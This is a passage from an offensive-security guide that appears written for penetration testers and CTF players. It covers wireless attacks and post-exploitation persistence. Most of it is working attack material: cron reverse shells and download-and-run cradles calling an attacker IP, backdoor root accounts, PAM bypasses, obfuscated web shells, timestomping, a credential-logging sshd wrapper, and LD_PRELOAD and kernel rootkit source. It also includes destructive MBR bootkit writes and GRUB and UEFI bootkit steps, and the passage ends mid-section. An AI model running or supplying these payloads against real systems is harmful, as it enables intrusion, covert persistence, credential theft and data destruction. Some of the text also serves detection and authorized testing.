tshark -r capture.pcap -Y "tls.handshake.version" \
  -T fields -e tls.handshake.version | sort | uniq -c

# Certificate extraction
tshark -r capture.pcap -Y "tls.handshake.certificate" \
  -T fields -e tls.handshake.certificate > certs.hex
```

**DNS Analysis from Wireless Traffic:**

```bash
# DNS queries reveal browsing activity even with HTTPS

# Extract DNS queries
tshark -r capture.pcap -Y "dns.qry.type == 1" \
  -T fields -e dns.qry.name | sort | uniq -c | sort -rn

# DNS tunneling detection
tshark -r capture.pcap -Y "dns" \
  -T fields -e dns.qry.name -e frame.len | \
  awk '$2 > 512 {print $1}'

# Identify DNS over HTTPS (DoH) usage
tshark -r capture.pcap -Y 'http.request.uri contains "dns-query"'
```

**Advanced Wireless Attack Scenarios:**

**Karma Attack (Auto-Join Exploitation):**

Devices automatically connect to networks they've previously joined. Karma attack exploits this by responding to all probe requests.

```bash
# Hostapd-mana - improved Karma implementation
git clone https://github.com/sensepost/hostapd-mana.git
cd hostapd-mana/hostapd
make

# Configuration
cat > mana.conf << EOF
interface=wlan0
driver=nl80211
ssid=InternetWiFi
channel=6
hw_mode=g

# Enable Karma
enable_mana=1
mana_karma=1

# Respond to all SSIDs
mana_loud=1
EOF

# Start attack
sudo ./hostapd mana.conf

# Clients probing for known networks will connect
# Even to differently-named AP
```

**PMKID Attack (WPA/WPA2 Roaming):**

Newer attack vector that captures PMKID from RSN IE without client association.

```bash
# Capture PMKID
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Or with hcxtools
sudo hcxdumptool --enable_status=3 -o pmkid.pcapng -i wlan0mon

# Convert for hashcat
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Verify PMKID captured
hcxpcapngtool --info pmkid.pcapng

# Crack with hashcat (mode 22000)
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# Advantages over handshake capture:
# - No client needed
# - No deauthentication required
# - Faster capture
# - Works on some routers that don't respond to deauth
```

**Wireless DoS Attacks:**

```bash
# Channel jamming with mdk4
sudo mdk4 wlan0mon d -c 6

# Beacon flooding
sudo mdk4 wlan0mon b -c 6

# Deauthentication attack (DoS)
sudo mdk4 wlan0mon d -c 6 -b AP_BSSID

# Authentication DoS
sudo mdk4 wlan0mon a -a AP_BSSID -i wlan0mon

# EAPOL start flooding (enterprise networks)
sudo mdk4 wlan0mon e -t AP_BSSID
```

[Inference]: Wireless DoS attacks are easily detectable and may violate availability requirements in penetration test rules of engagement. Always verify authorization for DoS testing.

**Wireless Network Bridging/Pivoting:**

Once connected to target wireless network, establish access for further attacks.

```bash
# SSH tunnel through compromised wireless connection
ssh -D 1080 user@attacker-server

# Configure proxychains
# Edit /etc/proxychains.conf
# Add: socks5 127.0.0.1 1080

# Route tools through tunnel
proxychains nmap -sT target_network

# OpenVPN back to attack infrastructure
openvpn --config client.ovpn

# Reverse SSH tunnel for persistent access
ssh -R 2222:localhost:22 user@attacker-server

# Port forwarding for specific services
ssh -L 8080:internal-web-server:80 user@pivot-host
```

**Automated Wireless Attack Frameworks:**

**WiFite2:**

```bash
# Install
sudo apt install wifite

# Automated attack on all networks
sudo wifite --kill

# Target specific encryption
sudo wifite --wpa --kill

# Use PMKID attack preferentially
sudo wifite --pmkid --kill

# Custom wordlist
sudo wifite --dict /path/to/wordlist.txt --kill

# Only attack WPS
sudo wifite --wps-only --kill

# Non-interactive mode
sudo wifite --no-wps --no-pmkid -e "TargetNetwork" --kill
```

**Airgeddon:**

```bash
# Install
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
sudo bash airgeddon.sh

# Menu-driven interface with multiple attack options:
# - Handshake capture tools
# - Evil Twin attacks
# - WPS attacks
# - DoS attacks
# - Enterprise attacks
# - Decryption tools
```

**Bettercap for Wireless:**

```bash
# Install bettercap
sudo apt install bettercap

# Enable WiFi module
sudo bettercap -iface wlan0mon

# Interactive shell
wifi.recon on
wifi.show

# Target specific AP
set wifi.ap.bssid AA:BB:CC:DD:EE:FF
set wifi.ap.essid CompanyWiFi

# Deauth clients
wifi.deauth all

# Create access point
set wifi.ap.ssid FreeWiFi
set wifi.ap.channel 6
wifi.ap
```

**Wireless Persistence Mechanisms:**

**Rogue Access Point with Auto-Start:**

```bash
# Systemd service for persistent rogue AP
sudo nano /etc/systemd/system/rogue-ap.service

# Service content:
cat > /etc/systemd/system/rogue-ap.service << EOF
[Unit]
Description=Rogue Access Point
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/start-rogue-ap.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
sudo systemctl enable rogue-ap.service
sudo systemctl start rogue-ap.service
```

**Wireless Hardware Implants:**

- **WiFi Pineapple** - Portable penetration testing platform
- **Raspberry Pi with WiFi adapters** - Custom wireless attack platform
- **WiFi Coconut** - Multi-radio WiFi auditing device
- **LAN Turtle** - Covert network access tool

**Raspberry Pi Rogue AP Configuration:**

```bash
# Configure as persistent implant
# Install required packages
sudo apt install hostapd dnsmasq

# Disable services initially
sudo systemctl stop hostapd
sudo systemctl stop dnsmasq

# Configure hostapd
sudo nano /etc/hostapd/hostapd.conf
# [Add configuration from earlier examples]

# Configure dnsmasq
sudo nano /etc/dnsmasq.conf
# [Add DHCP configuration]

# Enable IP forwarding
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p

# Configure iptables for NAT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo sh -c "iptables-save > /etc/iptables.ipv4.nat"

# Make iptables persistent
sudo apt install iptables-persistent

# Enable services
sudo systemctl unmask hostapd
sudo systemctl enable hostapd
sudo systemctl start hostapd
```

**Detection and Counter-Measures Awareness:**

Organizations may deploy:

- **Wireless Intrusion Detection Systems (WIDS)** - Detect rogue APs, deauth attacks, unusual traffic
- **Rogue AP detection** - Active scanning for unauthorized access points
- **Certificate pinning** - Prevent evil twin attacks on enterprise networks
- **802.11w (Management Frame Protection)** - Prevents deauthentication attacks
- **Network Access Control (NAC)** - MAC address filtering, 802.1X authentication
- **RF monitoring** - Continuous spectrum analysis for jamming detection

**Evasion Techniques:**

```bash
# Randomize MAC address frequently
sudo macchanger -r wlan0

# Use low power to reduce detection range
sudo iwconfig wlan0mon txpower 5

# Vary attack patterns (timing, targets)
# Avoid continuous deauth attacks

# Use legitimate-looking SSIDs
# Match organizational naming conventions

# Operate during high-traffic periods
# Attacks blend in with normal activity
```

**Reporting Physical/Wireless Findings:**

Professional penetration test reports should document:

1. **Networks discovered** - SSID, BSSID, encryption, signal strength
2. **Vulnerabilities identified** - Weak passwords, WPS enabled, lack of management frame protection
3. **Successful attacks** - Methodology, tools used, time to compromise
4. **Captured credentials** - Quantity (not actual passwords in report)
5. **Physical security gaps** - Unlocked network closets, visible network jacks
6. **Recommendations** - Specific, actionable remediation steps

---

**Important Related Topics:**

- **RFID/NFC Security** - Cloning access cards, badge readers
- **Zigbee/Z-Wave Attacks** - IoT protocol exploitation
- **LoRa/LoRaWAN Security** - Long-range IoT network attacks
- **802.11ax (WiFi 6/6E) Security** - Modern WiFi security features
- **Physical Penetration Testing** - Lock picking, social engineering, facility access

---

# POST-EXPLOITATION & LATERAL MOVEMENT

## Persistence Mechanisms

### Scheduled Task Persistence (Windows/Linux)

#### Windows Scheduled Tasks

**Native Windows Task Scheduler**

Creating persistence via `schtasks`:

```cmd
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru System
schtasks /create /tn "WindowsDefender" /tr "powershell.exe -WindowStyle Hidden -File C:\ProgramData\update.ps1" /sc daily /st 09:00
schtasks /create /tn "UpdateCheck" /tr "C:\Users\Public\malware.exe" /sc onstart /ru SYSTEM /rl highest
```

**PowerShell-based scheduling:**

```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command 'IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.5/payload.ps1\")'"
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "MicrosoftUpdate" -Action $action -Trigger $trigger -Principal $principal
```

**Enumeration and discovery:**

```cmd
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | Select-Object TaskName,TaskPath,State
```

**Registry locations for manual modification:**

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks
```

#### Linux Cron Jobs

**User-level cron persistence:**

```bash
crontab -e
# Add persistence entry
@reboot /tmp/.hidden/reverse_shell.sh
*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
0 */2 * * * curl http://10.10.14.5/payload.sh | bash
```

**System-wide cron directories:**

```bash
# Write directly to system cron files
echo "*/10 * * * * root /tmp/.update.sh" >> /etc/crontab
echo "@reboot root /usr/local/bin/backdoor" > /etc/cron.d/persistence

# Common cron directories
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/etc/cron.monthly/
/etc/cron.weekly/
/var/spool/cron/crontabs/
```

**Systemd timers (modern alternative):**

```bash
# Create service unit
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update Service

[Service]
Type=oneshot
ExecStart=/bin/bash /tmp/.hidden/payload.sh
EOF

# Create timer unit
cat > /etc/systemd/system/update.timer << EOF
[Unit]
Description=Update Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=1h

[Install]
WantedBy=timers.target
EOF

systemctl enable update.timer
systemctl start update.timer
```

**Enumeration:**

```bash
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
grep -r "CRON" /var/log/
systemctl list-timers --all
```

### Backdoor Accounts

#### Windows User Account Persistence

**Creating hidden administrative accounts:**

```cmd
net user backdoor P@ssw0rd123! /add
net localgroup Administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add

# Hide from login screen (registry modification)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backdoor /t REG_DWORD /d 0
```

**Creating accounts via PowerShell:**

```powershell
$Password = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force
New-LocalUser "Update" -Password $Password -FullName "Windows Update Service" -Description "System Account"
Add-LocalGroupMember -Group "Administrators" -Member "Update"
```

**Cloning existing admin accounts (mimicking legitimate users):**

```cmd
# Export admin SID/hash and create duplicate
wmic useraccount where name='Administrator' get sid
# Clone via registry manipulation
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
```

#### Linux User Account Persistence

**Creating root-equivalent accounts:**

```bash
# Add user with UID 0 (root equivalent)
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password123" | chpasswd

# Direct /etc/passwd modification
echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd
echo 'backdoor:$6$saltsalt$hashedpassword' >> /etc/shadow

# Create user with sudo privileges
useradd -m -s /bin/bash service
echo "service:password" | chpasswd
echo "service ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/service
```

**Passwordless authentication via PAM manipulation:**

```bash
# Modify PAM configuration
echo "auth sufficient pam_permit.so" >> /etc/pam.d/common-auth

# Create specific user exemption
sed -i '1i auth sufficient pam_succeed_if.so user = backdoor' /etc/pam.d/sshd
```

**Enumeration:**

```bash
# Linux
cat /etc/passwd | grep -E "bash|sh$"
awk -F: '$3 == 0 {print}' /etc/passwd
lastlog
cat /var/log/auth.log | grep "useradd"

# Windows
net user
net localgroup Administrators
Get-LocalUser | Where-Object {$_.Enabled -eq $true}
```

### Web Shell Installation

#### PHP Web Shells

**Simple command execution shell:**

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['c']); ?>
<?php eval($_POST['code']); ?>
```

**Feature-rich shells (examples of common patterns - [Inference] specific shell capabilities vary):**

```php
// File upload and execution
<?php
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}
if(isset($_GET['cmd'])){
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

**Obfuscated PHP shells:**

```php
<?php @eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
<?php $a='system'; $b=$_GET; $a($b['c']); ?>
<?php @$_++;@$_="";@$_=("#"^"|");@$_.=("."^"~");@$_.=("/"^"`");@$_.=("|"^"/");@$_.=("{"^"/");@$_();?>
```

**Common upload locations:**

```
/var/www/html/uploads/
/var/www/html/assets/images/
/var/www/html/media/
C:\inetpub\wwwroot\uploads\
C:\xampp\htdocs\uploads\
```

#### ASP/ASPX Web Shells

**ASP classic shell:**

```asp
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form("cmd")
If (szCMD <> "") Then
    Set oExec = oScript.Exec("cmd /c " & szCMD)
    Response.Write(oExec.StdOut.ReadAll)
End If
%>
```

**ASPX shell:**

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e){
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
</script>
```

#### JSP Web Shells

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    BufferedReader reader = new BufferedReader(new InputStreamReader(in));
    String line;
    while((line = reader.readLine()) != null) {
        out.println(line);
    }
%>
```

#### Detection Evasion Techniques

**Timestomping:**

```bash
# Linux - match timestamps to legitimate file
touch -r /var/www/html/index.php /var/www/html/shell.php
touch -t 202301150900.00 shell.php

# Windows
powershell (Get-Item shell.aspx).CreationTime = (Get-Item index.aspx).CreationTime
powershell (Get-Item shell.aspx).LastWriteTime = (Get-Item index.aspx).LastWriteTime
```

**File attribute manipulation:**

```cmd
# Windows - set hidden/system attributes
attrib +h +s shell.aspx

# Linux - hide in legitimate directories
mv shell.php /var/www/html/wp-includes/...php
```

**Enumeration for existing web shells:**

```bash
# Linux
find /var/www -name "*.php" -type f -exec grep -l "eval\|base64_decode\|system\|exec\|shell_exec" {} \;
find /var/www -type f -name "*.php" -mtime -7

# Windows
Get-ChildItem -Path C:\inetpub\wwwroot -Recurse -Include *.asp,*.aspx | Select-String -Pattern "eval|execute|cmd.exe"
```

### SSH Key Persistence

#### Authorized Keys Method

**Adding public keys to target system:**

```bash
# Generate SSH key pair on attacker machine
ssh-keygen -t rsa -b 4096 -f ~/.ssh/ctf_key -N ""

# Add public key to target's authorized_keys
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDxxxxx attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# For root persistence
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDxxxxx" >> /root/.ssh/authorized_keys
```

**Multiple user persistence:**

```bash
# Add to all users with home directories
for dir in /home/*; do
    mkdir -p "$dir/.ssh"
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDxxxxx" >> "$dir/.ssh/authorized_keys"
    chmod 700 "$dir/.ssh"
    chmod 600 "$dir/.ssh/authorized_keys"
done
```

**Key restrictions bypass:**

```bash
# Check for command restrictions in authorized_keys
cat ~/.ssh/authorized_keys | grep "command="

# Add unrestricted key
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQD... attacker@kali' >> ~/.ssh/authorized_keys
```

#### SSH Configuration Manipulation

**Modify sshd_config for persistent access:**

```bash
# Backup original config
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup

# Allow root login
sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config

# Allow password authentication (if disabled)
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Disable key checking
echo "StrictModes no" >> /etc/ssh/sshd_config

# Allow empty passwords [Inference: highly insecure, typically not default]
echo "PermitEmptyPasswords yes" >> /etc/ssh/sshd_config

# Restart SSH service
systemctl restart sshd
service ssh restart
```

**Alternative SSH ports:**

```bash
# Add additional listening port
echo "Port 22" >> /etc/ssh/sshd_config
echo "Port 2222" >> /etc/ssh/sshd_config
systemctl restart sshd
```

#### PAM Backdoors for SSH

**PAM module replacement (advanced technique - [Unverified] requires specific system configuration):**

```bash
# Backup original PAM module
cp /lib/x86_64-linux-gnu/security/pam_unix.so /tmp/pam_unix.so.backup

# Replace with backdoored PAM module (example pattern)
# This requires compiling custom PAM module with hardcoded password
gcc -fPIC -c pam_backdoor.c
ld -x --shared -o pam_unix.so pam_backdoor.o
cp pam_unix.so /lib/x86_64-linux-gnu/security/
```

#### SSH Wrapper Scripts

**Create wrapper to log credentials:**

```bash
# Move original SSH binary
mv /usr/sbin/sshd /usr/sbin/sshd.original

# Create wrapper script
cat > /usr/sbin/sshd << 'EOF'
#!/bin/bash
/usr/sbin/sshd.original "$@" | tee -a /tmp/.ssh.log &
EOF

chmod +x /usr/sbin/sshd
```

#### Connection Persistence via SSH

**Reverse SSH tunnel:**

```bash
# From compromised host to attacker
ssh -R 4444:localhost:22 attacker@10.10.14.5 -N -f -o StrictHostKeyChecking=no

# Maintain tunnel via cron
echo "*/5 * * * * /usr/bin/ssh -R 4444:localhost:22 attacker@10.10.14.5 -N -f -o StrictHostKeyChecking=no" | crontab -
```

**Persistent SSH connection with autossh:**

```bash
autossh -M 0 -N -R 4444:localhost:22 attacker@10.10.14.5 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" -f
```

#### Enumeration and Detection

**Check for suspicious SSH keys:**

```bash
# Find all authorized_keys files
find / -name authorized_keys 2>/dev/null

# Check for recently modified SSH keys
find /home -name authorized_keys -mtime -7 -ls
find /root/.ssh -type f -mtime -7

# Check SSH configuration
grep -E "PermitRootLogin|PasswordAuthentication|PubkeyAuthentication" /etc/ssh/sshd_config

# Review SSH logs
grep -i "Accepted publickey" /var/log/auth.log
grep -i "Accepted password" /var/log/auth.log
lastlog
```

**Windows SSH (OpenSSH on Windows):**

```cmd
# Check authorized_keys location
type C:\ProgramData\ssh\administrators_authorized_keys
type C:\Users\<username>\.ssh\authorized_keys

# Check SSH service configuration
Get-Service sshd
Get-Content C:\ProgramData\ssh\sshd_config
```

---

### Rootkit Installation

Rootkits are sophisticated malware designed to maintain privileged access while hiding their presence from standard detection methods. They operate at various system layers and require deep understanding of OS internals.

#### User-Mode Rootkits

User-mode rootkits operate at the application layer and are easier to develop but also easier to detect.

**Technique: Library Injection via LD_PRELOAD**

```bash
# Create a malicious shared library
gcc -shared -fPIC -o evil.so evil.c

# Set LD_PRELOAD globally
echo "/path/to/evil.so" > /etc/ld.so.preload

# Verify injection
ldd /bin/ls | grep evil
```

The malicious library intercepts function calls by overriding libc functions:

```c
// evil.c example - hiding files
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

struct dirent *(*original_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    
    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        if (strstr(entry->d_name, "malicious") == NULL) {
            return entry;
        }
    }
    return NULL;
}
```

**Technique: Binary Patching**

```bash
# Backup original binary
cp /bin/ps /bin/ps.bak

# Patch binary to hide processes
hexedit /bin/ps

# Use tools like patchelf to modify ELF headers
patchelf --set-interpreter /lib/evil_ld.so /bin/ps

# Automated patching with objcopy
objcopy --add-section .evil=/path/to/shellcode /bin/ps
```

#### Kernel-Mode Rootkits

[Inference] Kernel-mode rootkits are more difficult to detect and remove because they operate at ring 0 with full system privileges. Note: Behavior depends on specific kernel versions and configurations.

**Technique: Loadable Kernel Module (LKM) Rootkit**

```bash
# Check if kernel modules can be loaded
lsmod

# View module information
modinfo <module_name>

# Load a malicious kernel module
insmod rootkit.ko

# Make module load persistent
echo "rootkit" >> /etc/modules
cp rootkit.ko /lib/modules/$(uname -r)/

# Hide module from lsmod
# This requires modifying kernel's module list in memory
```

Basic LKM rootkit structure:

```c
// rootkit.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CTF");
MODULE_DESCRIPTION("Rootkit Module");

static unsigned long *sys_call_table;

// Store original syscall
asmlinkage long (*original_getdents64)(unsigned int fd, 
    struct linux_dirent64 __user *dirent, unsigned int count);

// Hooked syscall
asmlinkage long hooked_getdents64(unsigned int fd, 
    struct linux_dirent64 __user *dirent, unsigned int count) {
    
    long ret = original_getdents64(fd, dirent, count);
    // Filter directory entries here
    return ret;
}

static int __init rootkit_init(void) {
    // Find sys_call_table
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    
    // Disable write protection
    write_cr0(read_cr0() & (~0x10000));
    
    // Hook syscall
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    
    // Re-enable write protection
    write_cr0(read_cr0() | 0x10000);
    
    return 0;
}

static void __exit rootkit_exit(void) {
    // Unhook syscall
    write_cr0(read_cr0() & (~0x10000));
    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    write_cr0(read_cr0() | 0x10000);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
```

Compilation:

```bash
# Create Makefile
cat > Makefile << 'EOF'
obj-m += rootkit.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
EOF

# Compile
make

# Load module
insmod rootkit.ko
```

**Technique: Direct Kernel Object Manipulation (DKOM)**

DKOM modifies kernel data structures directly without hooking functions:

```c
// Hide process by unlinking from task list
struct task_struct *task = current;
list_del(&task->tasks);

// Hide module by removing from module list
list_del(&THIS_MODULE->list);
```

**Detection Evasion Commands**

```bash
# Check for hidden modules via /proc/modules vs lsmod differences
diff <(cat /proc/modules | cut -d' ' -f1 | sort) <(lsmod | tail -n+2 | cut -d' ' -f1 | sort)

# Detect syscall table hooks
cat /proc/kallsyms | grep sys_call_table

# Compare system map with running kernel
diff /boot/System.map-$(uname -r) <(cat /proc/kallsyms)
```

#### Rootkit Detection Tools

```bash
# chkrootkit - local rootkit detection
apt-get install chkrootkit
chkrootkit

# rkhunter - rootkit hunter
apt-get install rkhunter
rkhunter --update
rkhunter --check

# AIDE - Advanced Intrusion Detection Environment
apt-get install aide
aideinit
aide --check

# Detect LD_PRELOAD rootkits
cat /etc/ld.so.preload
strings /etc/ld.so.preload

# Manual syscall table inspection
grep sys_call_table /boot/System.map-$(uname -r)
cat /proc/kallsyms | grep sys_call_table
```

### Firmware Modifications

Firmware persistence operates below the OS layer, surviving reinstallations and disk wipes. [Unverified] These techniques are primarily used in advanced persistent threats (APTs) and are rarely seen in standard CTF challenges, but understanding them is valuable for comprehensive system security knowledge.

#### BIOS/UEFI Rootkits

**Reconnaissance**

```bash
# Check UEFI/BIOS version
dmidecode -t bios

# List UEFI variables
efivar -l

# Check secure boot status
mokutil --sb-state

# Dump BIOS/UEFI firmware
flashrom -p internal -r bios_dump.bin

# Alternative firmware dumping
dd if=/dev/mem bs=1k skip=768 count=256 of=bios.bin
```

**CHIPSEC Framework**

CHIPSEC is a framework for analyzing platform security, including firmware.

```bash
# Install CHIPSEC
git clone https://github.com/chipsec/chipsec.git
cd chipsec
python setup.py install

# Run all security checks
chipsec_main

# Specific module checks
chipsec_main -m common.bios_wp
chipsec_main -m common.smm
chipsec_main -m common.uefi.s3bootscript

# Dump UEFI firmware
chipsec_main -m tools.uefi.uefivar_fuzz

# Check BIOS write protection
chipsec_main -m common.bios_wp

# Scan for vulnerabilities
chipsec_main -m common.bios_kbrd_buffer
```

**UEFI Modification Techniques**

```bash
# Extract UEFI firmware using UEFITool
wget https://github.com/LongSoft/UEFITool/releases/download/[version]/UEFITool_[version]_linux_x86_64.tar.gz
tar -xzf UEFITool_*.tar.gz
./UEFITool bios_dump.bin

# Flash modified firmware (DANGEROUS)
flashrom -p internal -w modified_bios.bin

# EFI system partition modification
mount /dev/sda1 /mnt/efi
ls /mnt/efi/EFI/

# Modify bootloader
cp /mnt/efi/EFI/ubuntu/grubx64.efi /mnt/efi/EFI/ubuntu/grubx64.efi.bak
# Replace with malicious bootloader
```

**Technique: UEFI DXE Driver Implant**

[Inference] DXE (Driver Execution Environment) drivers execute during boot before the OS loads, making them powerful persistence mechanisms:

```bash
# Extract DXE drivers from firmware image
UEFIExtract bios_dump.bin

# View extracted files
find . -name "*.ffs"

# Use efiXplorer in IDA Pro or Ghidra for analysis
# Insert malicious DXE driver into firmware image

# Rebuild firmware image
uefi-firmware-parser --extract bios_dump.bin
# Modify extracted files
# Rebuild using appropriate tools
```

#### Intel Management Engine (IME) Exploitation

[Unverified] Intel ME is a separate processor running its own OS with direct hardware access. Compromising it provides ultimate persistence.

```bash
# Check ME version
intelmetool -s

# Dump ME firmware
me_cleaner -S -O me_dump.bin /dev/mem

# Analyze ME firmware
mei_amt_check

# Disable ME (if possible on older systems)
me_cleaner -S -d -O clean_me.bin bios.bin
flashrom -p internal -w clean_me.bin
```

**MEAnalyzer Tool**

```bash
# Install MEAnalyzer
git clone https://github.com/platomav/MEAnalyzer.git
cd MEAnalyzer
python MEA.py me_dump.bin

# Check for vulnerabilities
python MEA.py -check me_dump.bin
```

### Bootkit Installation

Bootkits compromise the boot process before the OS loads, operating at a lower level than traditional rootkits.

#### Master Boot Record (MBR) Bootkits

**MBR Structure Analysis**

```bash
# Backup MBR
dd if=/dev/sda of=mbr_backup.bin bs=512 count=1

# Analyze MBR
hexdump -C mbr_backup.bin

# View partition table
fdisk -l /dev/sda

# Analyze boot code
objdump -D -b binary -mi386 -Maddr16,data16 mbr_backup.bin
```

**Technique: MBR Infection**

```bash
# Create malicious MBR bootloader
nasm -f bin bootkit.asm -o bootkit.bin

# Verify size (must be <= 446 bytes for boot code)
ls -l bootkit.bin

# Write to MBR (DESTRUCTIVE)
dd if=bootkit.bin of=/dev/sda bs=440 count=1 conv=notrunc

# Preserve partition table while modifying boot code
dd if=bootkit.bin of=/dev/sda bs=1 count=440 conv=notrunc
```

Example bootkit assembly structure:

```nasm
; bootkit.asm
BITS 16
ORG 0x7C00

start:
    ; Bootkit code here
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00
    
    ; Hook INT 13h (disk I/O)
    mov ax, 0
    mov es, ax
    mov bx, [es:0x13*4]
    mov [original_int13], bx
    mov bx, [es:0x13*4+2]
    mov [original_int13+2], bx
    
    mov word [es:0x13*4], int13_handler
    mov word [es:0x13*4+2], 0
    
    ; Load original MBR from hidden location
    mov ah, 0x02
    mov al, 1
    mov ch, 0
    mov cl, 2
    mov dh, 0
    mov bx, 0x7C00
    int 0x13
    
    ; Jump to original MBR
    jmp 0x0000:0x7C00

int13_handler:
    ; Intercept disk operations
    pushf
    ; Custom code here
    popf
    jmp far [cs:original_int13]

original_int13: dd 0

times 510-($-$$) db 0
dw 0xAA55
```

**Detection and Analysis**

```bash
# Detect MBR anomalies
dd if=/dev/sda bs=512 count=1 | xxd | less

# Compare with known-good MBR
cmp mbr_backup.bin known_good_mbr.bin

# Automated MBR analysis
gmer -mbr

# Linux tool for MBR examination
apt-get install mbr
install-mbr --test /dev/sda
```

#### GRUB Bootloader Modification

**Technique: GRUB Configuration Backdoor**

```bash
# Backup GRUB configuration
cp /boot/grub/grub.cfg /boot/grub/grub.cfg.bak

# Add malicious module load
echo 'insmod /boot/grub/malicious.mod' >> /boot/grub/grub.cfg

# Modify kernel parameters to disable security
# Edit /etc/default/grub
GRUB_CMDLINE_LINUX="init=/path/to/malicious_init"

# Update GRUB
update-grub

# Set GRUB password to prevent tampering detection
grub-mkpasswd-pbkdf2
# Add password to /etc/grub.d/40_custom
```

**Technique: GRUB Module Injection**

```bash
# GRUB modules location
ls /boot/grub/i386-pc/

# Create malicious GRUB module (advanced)
# Requires GRUB source code and development environment

# Inject module
cp malicious.mod /boot/grub/i386-pc/

# Force load via grub.cfg
echo 'insmod malicious' >> /boot/grub/grub.cfg
```

#### UEFI Bootkit (More Advanced)

**Technique: EFI Boot Manager Modification**

```bash
# List boot entries
efibootmgr -v

# Create malicious boot entry
efibootmgr -c -d /dev/sda -p 1 -L "Malicious" -l \\EFI\\malicious\\bootx64.efi

# Set boot order to prioritize malicious entry
efibootmgr -o 0004,0000,0001

# Hide from efibootmgr (requires NVRAM manipulation)
# [Inference] This typically requires kernel module or direct hardware access
```

**Technique: Shim Bootloader Replacement**

```bash
# UEFI Secure Boot shim location
ls /boot/efi/EFI/ubuntu/shimx64.efi

# Backup original shim
cp /boot/efi/EFI/ubuntu/shimx64.efi /boot/efi/EFI/ubuntu/shimx64.efi.bak

# Replace with malicious shim that loads both legitimate and malicious code
